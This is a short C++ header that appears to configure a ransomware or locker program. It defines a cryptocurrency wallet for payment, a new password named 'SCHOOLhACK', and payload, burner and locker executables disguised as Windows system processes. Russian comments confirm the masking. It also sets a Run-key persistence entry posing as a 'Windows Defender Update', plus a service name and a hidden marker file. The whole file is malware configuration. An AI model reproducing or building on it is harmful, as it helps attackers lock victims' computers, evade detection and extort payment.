#pragma once
#include <string>

const std::wstring WALLET = L"UQBc4oF7CJFwItzeiu-3R_8ODlk--uzkvIIcfre_ZXNfOwIq";
const std::wstring NEW_PASSWORD = L"SCHOOLhACK12389S";

// маскируем имена процессов под системные
const wchar_t* PAYLOAD_NAME   = L"svchost.exe";
const wchar_t* BURNER_NAME    = L"conhost.exe";
const wchar_t* LOCKER_NAME    = L"dllhost.exe";

// реестровые ключи маскировки
const wchar_t* REG_RUN_KEY    = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
const wchar_t* REG_RUN_NAME   = L"Windows Defender Update";
const wchar_t* REG_SVC_NAME   = L"WinDefendUpdate";
const wchar_t* MARKER_PATH    = L"C:\\Windows\\System32\\drivers\\etc\\hosts.sys.marker";
